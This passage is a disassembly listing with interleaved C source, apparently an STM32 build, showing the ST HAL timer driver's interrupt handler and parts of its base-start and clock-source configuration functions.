 8004f3a:	d015      	beq.n	8004f68 <HAL_TIM_Base_Start_IT+0x8c>
 8004f3c:	68fb      	ldr	r3, [r7, #12]
 8004f3e:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8004f42:	d011      	beq.n	8004f68 <HAL_TIM_Base_Start_IT+0x8c>
    {
      __HAL_TIM_ENABLE(htim);
 8004f44:	687b      	ldr	r3, [r7, #4]
 8004f46:	681b      	ldr	r3, [r3, #0]
 8004f48:	681a      	ldr	r2, [r3, #0]
 8004f4a:	687b      	ldr	r3, [r7, #4]
 8004f4c:	681b      	ldr	r3, [r3, #0]
 8004f4e:	f042 0201 	orr.w	r2, r2, #1
 8004f52:	601a      	str	r2, [r3, #0]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004f54:	e008      	b.n	8004f68 <HAL_TIM_Base_Start_IT+0x8c>
    }
  }
  else
  {
    __HAL_TIM_ENABLE(htim);
 8004f56:	687b      	ldr	r3, [r7, #4]
 8004f58:	681b      	ldr	r3, [r3, #0]
 8004f5a:	681a      	ldr	r2, [r3, #0]
 8004f5c:	687b      	ldr	r3, [r7, #4]
 8004f5e:	681b      	ldr	r3, [r3, #0]
 8004f60:	f042 0201 	orr.w	r2, r2, #1
 8004f64:	601a      	str	r2, [r3, #0]
 8004f66:	e000      	b.n	8004f6a <HAL_TIM_Base_Start_IT+0x8e>
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004f68:	bf00      	nop
  }

  /* Return function status */
  return HAL_OK;
 8004f6a:	2300      	movs	r3, #0
}
 8004f6c:	4618      	mov	r0, r3
 8004f6e:	3714      	adds	r7, #20
 8004f70:	46bd      	mov	sp, r7
 8004f72:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004f76:	4770      	bx	lr
 8004f78:	40012c00 	.word	0x40012c00
 8004f7c:	40014000 	.word	0x40014000
 8004f80:	00010007 	.word	0x00010007

08004f84 <HAL_TIM_IRQHandler>:
  * @brief  This function handles TIM interrupts requests.
  * @param  htim TIM  handle
  * @retval None
  */
void HAL_TIM_IRQHandler(TIM_HandleTypeDef *htim)
{
 8004f84:	b580      	push	{r7, lr}
 8004f86:	b084      	sub	sp, #16
 8004f88:	af00      	add	r7, sp, #0
 8004f8a:	6078      	str	r0, [r7, #4]
  uint32_t itsource = htim->Instance->DIER;
 8004f8c:	687b      	ldr	r3, [r7, #4]
 8004f8e:	681b      	ldr	r3, [r3, #0]
 8004f90:	68db      	ldr	r3, [r3, #12]
 8004f92:	60fb      	str	r3, [r7, #12]
  uint32_t itflag   = htim->Instance->SR;
 8004f94:	687b      	ldr	r3, [r7, #4]
 8004f96:	681b      	ldr	r3, [r3, #0]
 8004f98:	691b      	ldr	r3, [r3, #16]
 8004f9a:	60bb      	str	r3, [r7, #8]

  /* Capture compare 1 event */
  if ((itflag & (TIM_FLAG_CC1)) == (TIM_FLAG_CC1))
 8004f9c:	68bb      	ldr	r3, [r7, #8]
 8004f9e:	f003 0302 	and.w	r3, r3, #2
 8004fa2:	2b00      	cmp	r3, #0
 8004fa4:	d020      	beq.n	8004fe8 <HAL_TIM_IRQHandler+0x64>
  {
    if ((itsource & (TIM_IT_CC1)) == (TIM_IT_CC1))
 8004fa6:	68fb      	ldr	r3, [r7, #12]
 8004fa8:	f003 0302 	and.w	r3, r3, #2
 8004fac:	2b00      	cmp	r3, #0
 8004fae:	d01b      	beq.n	8004fe8 <HAL_TIM_IRQHandler+0x64>
    {
      {
        __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC1);
 8004fb0:	687b      	ldr	r3, [r7, #4]
 8004fb2:	681b      	ldr	r3, [r3, #0]
 8004fb4:	f06f 0202 	mvn.w	r2, #2
 8004fb8:	611a      	str	r2, [r3, #16]
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_1;
 8004fba:	687b      	ldr	r3, [r7, #4]
 8004fbc:	2201      	movs	r2, #1
 8004fbe:	771a      	strb	r2, [r3, #28]

        /* Input capture event */
        if ((htim->Instance->CCMR1 & TIM_CCMR1_CC1S) != 0x00U)
 8004fc0:	687b      	ldr	r3, [r7, #4]
 8004fc2:	681b      	ldr	r3, [r3, #0]
 8004fc4:	699b      	ldr	r3, [r3, #24]
 8004fc6:	f003 0303 	and.w	r3, r3, #3
 8004fca:	2b00      	cmp	r3, #0
 8004fcc:	d003      	beq.n	8004fd6 <HAL_TIM_IRQHandler+0x52>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->IC_CaptureCallback(htim);
#else
          HAL_TIM_IC_CaptureCallback(htim);
 8004fce:	6878      	ldr	r0, [r7, #4]
 8004fd0:	f000 f9ad 	bl	800532e <HAL_TIM_IC_CaptureCallback>
 8004fd4:	e005      	b.n	8004fe2 <HAL_TIM_IRQHandler+0x5e>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->OC_DelayElapsedCallback(htim);
          htim->PWM_PulseFinishedCallback(htim);
#else
          HAL_TIM_OC_DelayElapsedCallback(htim);
 8004fd6:	6878      	ldr	r0, [r7, #4]
 8004fd8:	f000 f99f 	bl	800531a <HAL_TIM_OC_DelayElapsedCallback>
          HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004fdc:	6878      	ldr	r0, [r7, #4]
 8004fde:	f000 f9b0 	bl	8005342 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
        }
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004fe2:	687b      	ldr	r3, [r7, #4]
 8004fe4:	2200      	movs	r2, #0
 8004fe6:	771a      	strb	r2, [r3, #28]
      }
    }
  }
  /* Capture compare 2 event */
  if ((itflag & (TIM_FLAG_CC2)) == (TIM_FLAG_CC2))
 8004fe8:	68bb      	ldr	r3, [r7, #8]
 8004fea:	f003 0304 	and.w	r3, r3, #4
 8004fee:	2b00      	cmp	r3, #0
 8004ff0:	d020      	beq.n	8005034 <HAL_TIM_IRQHandler+0xb0>
  {
    if ((itsource & (TIM_IT_CC2)) == (TIM_IT_CC2))
 8004ff2:	68fb      	ldr	r3, [r7, #12]
 8004ff4:	f003 0304 	and.w	r3, r3, #4
 8004ff8:	2b00      	cmp	r3, #0
 8004ffa:	d01b      	beq.n	8005034 <HAL_TIM_IRQHandler+0xb0>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC2);
 8004ffc:	687b      	ldr	r3, [r7, #4]
 8004ffe:	681b      	ldr	r3, [r3, #0]
 8005000:	f06f 0204 	mvn.w	r2, #4
 8005004:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_2;
 8005006:	687b      	ldr	r3, [r7, #4]
 8005008:	2202      	movs	r2, #2
 800500a:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR1 & TIM_CCMR1_CC2S) != 0x00U)
 800500c:	687b      	ldr	r3, [r7, #4]
 800500e:	681b      	ldr	r3, [r3, #0]
 8005010:	699b      	ldr	r3, [r3, #24]
 8005012:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8005016:	2b00      	cmp	r3, #0
 8005018:	d003      	beq.n	8005022 <HAL_TIM_IRQHandler+0x9e>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 800501a:	6878      	ldr	r0, [r7, #4]
 800501c:	f000 f987 	bl	800532e <HAL_TIM_IC_CaptureCallback>
 8005020:	e005      	b.n	800502e <HAL_TIM_IRQHandler+0xaa>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8005022:	6878      	ldr	r0, [r7, #4]
 8005024:	f000 f979 	bl	800531a <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8005028:	6878      	ldr	r0, [r7, #4]
 800502a:	f000 f98a 	bl	8005342 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 800502e:	687b      	ldr	r3, [r7, #4]
 8005030:	2200      	movs	r2, #0
 8005032:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 3 event */
  if ((itflag & (TIM_FLAG_CC3)) == (TIM_FLAG_CC3))
 8005034:	68bb      	ldr	r3, [r7, #8]
 8005036:	f003 0308 	and.w	r3, r3, #8
 800503a:	2b00      	cmp	r3, #0
 800503c:	d020      	beq.n	8005080 <HAL_TIM_IRQHandler+0xfc>
  {
    if ((itsource & (TIM_IT_CC3)) == (TIM_IT_CC3))
 800503e:	68fb      	ldr	r3, [r7, #12]
 8005040:	f003 0308 	and.w	r3, r3, #8
 8005044:	2b00      	cmp	r3, #0
 8005046:	d01b      	beq.n	8005080 <HAL_TIM_IRQHandler+0xfc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC3);
 8005048:	687b      	ldr	r3, [r7, #4]
 800504a:	681b      	ldr	r3, [r3, #0]
 800504c:	f06f 0208 	mvn.w	r2, #8
 8005050:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_3;
 8005052:	687b      	ldr	r3, [r7, #4]
 8005054:	2204      	movs	r2, #4
 8005056:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC3S) != 0x00U)
 8005058:	687b      	ldr	r3, [r7, #4]
 800505a:	681b      	ldr	r3, [r3, #0]
 800505c:	69db      	ldr	r3, [r3, #28]
 800505e:	f003 0303 	and.w	r3, r3, #3
 8005062:	2b00      	cmp	r3, #0
 8005064:	d003      	beq.n	800506e <HAL_TIM_IRQHandler+0xea>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8005066:	6878      	ldr	r0, [r7, #4]
 8005068:	f000 f961 	bl	800532e <HAL_TIM_IC_CaptureCallback>
 800506c:	e005      	b.n	800507a <HAL_TIM_IRQHandler+0xf6>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 800506e:	6878      	ldr	r0, [r7, #4]
 8005070:	f000 f953 	bl	800531a <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8005074:	6878      	ldr	r0, [r7, #4]
 8005076:	f000 f964 	bl	8005342 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 800507a:	687b      	ldr	r3, [r7, #4]
 800507c:	2200      	movs	r2, #0
 800507e:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 4 event */
  if ((itflag & (TIM_FLAG_CC4)) == (TIM_FLAG_CC4))
 8005080:	68bb      	ldr	r3, [r7, #8]
 8005082:	f003 0310 	and.w	r3, r3, #16
 8005086:	2b00      	cmp	r3, #0
 8005088:	d020      	beq.n	80050cc <HAL_TIM_IRQHandler+0x148>
  {
    if ((itsource & (TIM_IT_CC4)) == (TIM_IT_CC4))
 800508a:	68fb      	ldr	r3, [r7, #12]
 800508c:	f003 0310 	and.w	r3, r3, #16
 8005090:	2b00      	cmp	r3, #0
 8005092:	d01b      	beq.n	80050cc <HAL_TIM_IRQHandler+0x148>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC4);
 8005094:	687b      	ldr	r3, [r7, #4]
 8005096:	681b      	ldr	r3, [r3, #0]
 8005098:	f06f 0210 	mvn.w	r2, #16
 800509c:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_4;
 800509e:	687b      	ldr	r3, [r7, #4]
 80050a0:	2208      	movs	r2, #8
 80050a2:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC4S) != 0x00U)
 80050a4:	687b      	ldr	r3, [r7, #4]
 80050a6:	681b      	ldr	r3, [r3, #0]
 80050a8:	69db      	ldr	r3, [r3, #28]
 80050aa:	f403 7340 	and.w	r3, r3, #768	; 0x300
 80050ae:	2b00      	cmp	r3, #0
 80050b0:	d003      	beq.n	80050ba <HAL_TIM_IRQHandler+0x136>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 80050b2:	6878      	ldr	r0, [r7, #4]
 80050b4:	f000 f93b 	bl	800532e <HAL_TIM_IC_CaptureCallback>
 80050b8:	e005      	b.n	80050c6 <HAL_TIM_IRQHandler+0x142>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 80050ba:	6878      	ldr	r0, [r7, #4]
 80050bc:	f000 f92d 	bl	800531a <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 80050c0:	6878      	ldr	r0, [r7, #4]
 80050c2:	f000 f93e 	bl	8005342 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 80050c6:	687b      	ldr	r3, [r7, #4]
 80050c8:	2200      	movs	r2, #0
 80050ca:	771a      	strb	r2, [r3, #28]
    }
  }
  /* TIM Update event */
  if ((itflag & (TIM_FLAG_UPDATE)) == (TIM_FLAG_UPDATE))
 80050cc:	68bb      	ldr	r3, [r7, #8]
 80050ce:	f003 0301 	and.w	r3, r3, #1
 80050d2:	2b00      	cmp	r3, #0
 80050d4:	d00c      	beq.n	80050f0 <HAL_TIM_IRQHandler+0x16c>
  {
    if ((itsource & (TIM_IT_UPDATE)) == (TIM_IT_UPDATE))
 80050d6:	68fb      	ldr	r3, [r7, #12]
 80050d8:	f003 0301 	and.w	r3, r3, #1
 80050dc:	2b00      	cmp	r3, #0
 80050de:	d007      	beq.n	80050f0 <HAL_TIM_IRQHandler+0x16c>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_UPDATE);
 80050e0:	687b      	ldr	r3, [r7, #4]
 80050e2:	681b      	ldr	r3, [r3, #0]
 80050e4:	f06f 0201 	mvn.w	r2, #1
 80050e8:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->PeriodElapsedCallback(htim);
#else
      HAL_TIM_PeriodElapsedCallback(htim);
 80050ea:	6878      	ldr	r0, [r7, #4]
 80050ec:	f7fb fe64 	bl	8000db8 <HAL_TIM_PeriodElapsedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break input event */
  if ((itflag & (TIM_FLAG_BREAK)) == (TIM_FLAG_BREAK))
 80050f0:	68bb      	ldr	r3, [r7, #8]
 80050f2:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80050f6:	2b00      	cmp	r3, #0
 80050f8:	d00c      	beq.n	8005114 <HAL_TIM_IRQHandler+0x190>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 80050fa:	68fb      	ldr	r3, [r7, #12]
 80050fc:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005100:	2b00      	cmp	r3, #0
 8005102:	d007      	beq.n	8005114 <HAL_TIM_IRQHandler+0x190>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_BREAK);
 8005104:	687b      	ldr	r3, [r7, #4]
 8005106:	681b      	ldr	r3, [r3, #0]
 8005108:	f06f 0280 	mvn.w	r2, #128	; 0x80
 800510c:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->BreakCallback(htim);
#else
      HAL_TIMEx_BreakCallback(htim);
 800510e:	6878      	ldr	r0, [r7, #4]
 8005110:	f000 fa9a 	bl	8005648 <HAL_TIMEx_BreakCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break2 input event */
  if ((itflag & (TIM_FLAG_BREAK2)) == (TIM_FLAG_BREAK2))
 8005114:	68bb      	ldr	r3, [r7, #8]
 8005116:	f403 7380 	and.w	r3, r3, #256	; 0x100
 800511a:	2b00      	cmp	r3, #0
 800511c:	d00c      	beq.n	8005138 <HAL_TIM_IRQHandler+0x1b4>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 800511e:	68fb      	ldr	r3, [r7, #12]
 8005120:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005124:	2b00      	cmp	r3, #0
 8005126:	d007      	beq.n	8005138 <HAL_TIM_IRQHandler+0x1b4>
    {
      __HAL_TIM_CLEAR_FLAG(htim, TIM_FLAG_BREAK2);
 8005128:	687b      	ldr	r3, [r7, #4]
 800512a:	681b      	ldr	r3, [r3, #0]
 800512c:	f46f 7280 	mvn.w	r2, #256	; 0x100
 8005130:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->Break2Callback(htim);
#else
      HAL_TIMEx_Break2Callback(htim);
 8005132:	6878      	ldr	r0, [r7, #4]
 8005134:	f000 fa92 	bl	800565c <HAL_TIMEx_Break2Callback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Trigger detection event */
  if ((itflag & (TIM_FLAG_TRIGGER)) == (TIM_FLAG_TRIGGER))
 8005138:	68bb      	ldr	r3, [r7, #8]
 800513a:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800513e:	2b00      	cmp	r3, #0
 8005140:	d00c      	beq.n	800515c <HAL_TIM_IRQHandler+0x1d8>
  {
    if ((itsource & (TIM_IT_TRIGGER)) == (TIM_IT_TRIGGER))
 8005142:	68fb      	ldr	r3, [r7, #12]
 8005144:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005148:	2b00      	cmp	r3, #0
 800514a:	d007      	beq.n	800515c <HAL_TIM_IRQHandler+0x1d8>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_TRIGGER);
 800514c:	687b      	ldr	r3, [r7, #4]
 800514e:	681b      	ldr	r3, [r3, #0]
 8005150:	f06f 0240 	mvn.w	r2, #64	; 0x40
 8005154:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->TriggerCallback(htim);
#else
      HAL_TIM_TriggerCallback(htim);
 8005156:	6878      	ldr	r0, [r7, #4]
 8005158:	f000 f8fd 	bl	8005356 <HAL_TIM_TriggerCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM commutation event */
  if ((itflag & (TIM_FLAG_COM)) == (TIM_FLAG_COM))
 800515c:	68bb      	ldr	r3, [r7, #8]
 800515e:	f003 0320 	and.w	r3, r3, #32
 8005162:	2b00      	cmp	r3, #0
 8005164:	d00c      	beq.n	8005180 <HAL_TIM_IRQHandler+0x1fc>
  {
    if ((itsource & (TIM_IT_COM)) == (TIM_IT_COM))
 8005166:	68fb      	ldr	r3, [r7, #12]
 8005168:	f003 0320 	and.w	r3, r3, #32
 800516c:	2b00      	cmp	r3, #0
 800516e:	d007      	beq.n	8005180 <HAL_TIM_IRQHandler+0x1fc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_FLAG_COM);
 8005170:	687b      	ldr	r3, [r7, #4]
 8005172:	681b      	ldr	r3, [r3, #0]
 8005174:	f06f 0220 	mvn.w	r2, #32
 8005178:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->CommutationCallback(htim);
#else
      HAL_TIMEx_CommutCallback(htim);
 800517a:	6878      	ldr	r0, [r7, #4]
 800517c:	f000 fa5a 	bl	8005634 <HAL_TIMEx_CommutCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
}
 8005180:	bf00      	nop
 8005182:	3710      	adds	r7, #16
 8005184:	46bd      	mov	sp, r7
 8005186:	bd80      	pop	{r7, pc}

08005188 <HAL_TIM_ConfigClockSource>:
  * @param  sClockSourceConfig pointer to a TIM_ClockConfigTypeDef structure that
  *         contains the clock source information for the TIM peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_ConfigClockSource(TIM_HandleTypeDef *htim, const TIM_ClockConfigTypeDef *sClockSourceConfig)
{
 8005188:	b580      	push	{r7, lr}
 800518a:	b084      	sub	sp, #16
 800518c:	af00      	add	r7, sp, #0
 800518e:	6078      	str	r0, [r7, #4]
 8005190:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status = HAL_OK;
 8005192:	2300      	movs	r3, #0
 8005194:	73fb      	strb	r3, [r7, #15]
  uint32_t tmpsmcr;

  /* Process Locked */
  __HAL_LOCK(htim);
 8005196:	687b      	ldr	r3, [r7, #4]
 8005198:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 800519c:	2b01      	cmp	r3, #1
 800519e:	d101      	bne.n	80051a4 <HAL_TIM_ConfigClockSource+0x1c>
 80051a0:	2302      	movs	r3, #2
 80051a2:	e0b6      	b.n	8005312 <HAL_TIM_ConfigClockSource+0x18a>
 80051a4:	687b      	ldr	r3, [r7, #4]
 80051a6:	2201      	movs	r2, #1
 80051a8:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  htim->State = HAL_TIM_STATE_BUSY;
 80051ac:	687b      	ldr	r3, [r7, #4]
 80051ae:	2202      	movs	r2, #2
 80051b0:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Check the parameters */
  assert_param(IS_TIM_CLOCKSOURCE(sClockSourceConfig->ClockSource));

  /* Reset the SMS, TS, ECE, ETPS and ETRF bits */
  tmpsmcr = htim->Instance->SMCR;
 80051b4:	687b      	ldr	r3, [r7, #4]
 80051b6:	681b      	ldr	r3, [r3, #0]
 80051b8:	689b      	ldr	r3, [r3, #8]
 80051ba:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_SMS | TIM_SMCR_TS);
 80051bc:	68bb      	ldr	r3, [r7, #8]
 80051be:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 80051c2:	f023 0377 	bic.w	r3, r3, #119	; 0x77
 80051c6:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 80051c8:	68bb      	ldr	r3, [r7, #8]
 80051ca:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 80051ce:	60bb      	str	r3, [r7, #8]
  htim->Instance->SMCR = tmpsmcr;
 80051d0:	687b      	ldr	r3, [r7, #4]
 80051d2:	681b      	ldr	r3, [r3, #0]
 80051d4:	68ba      	ldr	r2, [r7, #8]
 80051d6:	609a      	str	r2, [r3, #8]

  switch (sClockSourceConfig->ClockSource)
 80051d8:	683b      	ldr	r3, [r7, #0]
 80051da:	681b      	ldr	r3, [r3, #0]
 80051dc:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 80051e0:	d03e      	beq.n	8005260 <HAL_TIM_ConfigClockSource+0xd8>
 80051e2:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 80051e6:	f200 8087 	bhi.w	80052f8 <HAL_TIM_ConfigClockSource+0x170>
 80051ea:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 80051ee:	f000 8086 	beq.w	80052fe <HAL_TIM_ConfigClockSource+0x176>
 80051f2:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 80051f6:	d87f      	bhi.n	80052f8 <HAL_TIM_ConfigClockSource+0x170>
 80051f8:	2b70      	cmp	r3, #112	; 0x70
 80051fa:	d01a      	beq.n	8005232 <HAL_TIM_ConfigClockSource+0xaa>
 80051fc:	2b70      	cmp	r3, #112	; 0x70
 80051fe:	d87b      	bhi.n	80052f8 <HAL_TIM_ConfigClockSource+0x170>
 8005200:	2b60      	cmp	r3, #96	; 0x60
 8005202:	d050      	beq.n	80052a6 <HAL_TIM_ConfigClockSource+0x11e>
 8005204:	2b60      	cmp	r3, #96	; 0x60
 8005206:	d877      	bhi.n	80052f8 <HAL_TIM_ConfigClockSource+0x170>
 8005208:	2b50      	cmp	r3, #80	; 0x50
 800520a:	d03c      	beq.n	8005286 <HAL_TIM_ConfigClockSource+0xfe>
 800520c:	2b50      	cmp	r3, #80	; 0x50
 800520e:	d873      	bhi.n	80052f8 <HAL_TIM_ConfigClockSource+0x170>
 8005210:	2b40      	cmp	r3, #64	; 0x40
 8005212:	d058      	beq.n	80052c6 <HAL_TIM_ConfigClockSource+0x13e>
 8005214:	2b40      	cmp	r3, #64	; 0x40
 8005216:	d86f      	bhi.n	80052f8 <HAL_TIM_ConfigClockSource+0x170>
 8005218:	2b30      	cmp	r3, #48	; 0x30
 800521a:	d064      	beq.n	80052e6 <HAL_TIM_ConfigClockSource+0x15e>
 800521c:	2b30      	cmp	r3, #48	; 0x30
 800521e:	d86b      	bhi.n	80052f8 <HAL_TIM_ConfigClockSource+0x170>
 8005220:	2b20      	cmp	r3, #32
 8005222:	d060      	beq.n	80052e6 <HAL_TIM_ConfigClockSource+0x15e>
 8005224:	2b20      	cmp	r3, #32
 8005226:	d867      	bhi.n	80052f8 <HAL_TIM_ConfigClockSource+0x170>
 8005228:	2b00      	cmp	r3, #0
 800522a:	d05c      	beq.n	80052e6 <HAL_TIM_ConfigClockSource+0x15e>
 800522c:	2b10      	cmp	r3, #16
 800522e:	d05a      	beq.n	80052e6 <HAL_TIM_ConfigClockSource+0x15e>
 8005230:	e062      	b.n	80052f8 <HAL_TIM_ConfigClockSource+0x170>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 8005232:	687b      	ldr	r3, [r7, #4]
 8005234:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 8005236:	683b      	ldr	r3, [r7, #0]
 8005238:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 800523a:	683b      	ldr	r3, [r7, #0]
 800523c:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 800523e:	683b      	ldr	r3, [r7, #0]
 8005240:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 8005242:	f000 f971 	bl	8005528 <TIM_ETR_SetConfig>

      /* Select the External clock mode1 and the ETRF trigger */
      tmpsmcr = htim->Instance->SMCR;
 8005246:	687b      	ldr	r3, [r7, #4]
 8005248:	681b      	ldr	r3, [r3, #0]
 800524a:	689b      	ldr	r3, [r3, #8]
 800524c:	60bb      	str	r3, [r7, #8]
      tmpsmcr |= (TIM_SLAVEMODE_EXTERNAL1 | TIM_CLOCKSOURCE_ETRMODE1);
 800524e:	68bb      	ldr	r3, [r7, #8]
 8005250:	f043 0377 	orr.w	r3, r3, #119	; 0x77
 8005254:	60bb      	str	r3, [r7, #8]
      /* Write to TIMx SMCR */
      htim->Instance->SMCR = tmpsmcr;
 8005256:	687b      	ldr	r3, [r7, #4]
 8005258:	681b      	ldr	r3, [r3, #0]
 800525a:	68ba      	ldr	r2, [r7, #8]
 800525c:	609a      	str	r2, [r3, #8]
      break;
 800525e:	e04f      	b.n	8005300 <HAL_TIM_ConfigClockSource+0x178>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 8005260:	687b      	ldr	r3, [r7, #4]
 8005262:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 8005264:	683b      	ldr	r3, [r7, #0]
 8005266:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 8005268:	683b      	ldr	r3, [r7, #0]
 800526a:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 800526c:	683b      	ldr	r3, [r7, #0]
 800526e:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 8005270:	f000 f95a 	bl	8005528 <TIM_ETR_SetConfig>
      /* Enable the External clock mode2 */
      htim->Instance->SMCR |= TIM_SMCR_ECE;
 8005274:	687b      	ldr	r3, [r7, #4]
 8005276:	681b      	ldr	r3, [r3, #0]
 8005278:	689a      	ldr	r2, [r3, #8]
 800527a:	687b      	ldr	r3, [r7, #4]
 800527c:	681b      	ldr	r3, [r3, #0]
 800527e:	f442 4280 	orr.w	r2, r2, #16384	; 0x4000
 8005282:	609a      	str	r2, [r3, #8]
      break;
 8005284:	e03c      	b.n	8005300 <HAL_TIM_ConfigClockSource+0x178>

